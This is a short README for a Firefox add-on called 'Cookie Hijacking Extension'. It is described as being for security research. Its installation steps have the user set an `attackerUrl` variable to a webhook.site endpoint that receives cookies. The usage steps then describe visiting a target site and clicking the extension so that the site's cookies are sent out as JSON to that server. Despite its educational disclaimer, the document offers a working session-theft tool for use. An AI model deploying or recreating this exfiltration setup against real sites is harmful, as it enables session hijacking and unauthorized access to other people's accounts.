# Cookie Hijacking Extension
The Cookie Hijacking Extension is a Firefox browser add-on designed for security researchers and professionals. This extension allows users to understand and demonstrate vulnerabilities related to cookie hijacking, a common security issue that can lead to unauthorized access to user sessions.


Note: This extension is intended for educational and research purposes only.

## Installation
1. Clone this repository to your local machine:
```
https://github.com/rafaelcintralopes/cookie-hijacking-extension.git
```
2. Insert the URL of the attacker that will receive the cookies into the `attackerUrl` variable of the `popup/popup.js` file:
```
var attackerUrl = "https://webhook.site/7d5c5233-6056-4467-8310-42a5a7daee55"
```

4. Load Extension in Firefox:
- Open Firefox and go to `about:debugging#/runtime/this-firefox`.
- Click on "Load Temporary Add-on…".
- Select the `manifest.json` file from the extension folder.

## Usage
1. Turn on the server that will receive requests containing cookies.
2. Access the target website.
3. Click on the extension.
4. Your server will receive cookies in JSON.

## Disclaimer
This extension is for educational purposes only. The developer do not endorse or condone any illegal or unethical use of this tool. Always seek permission before testing on any web application.
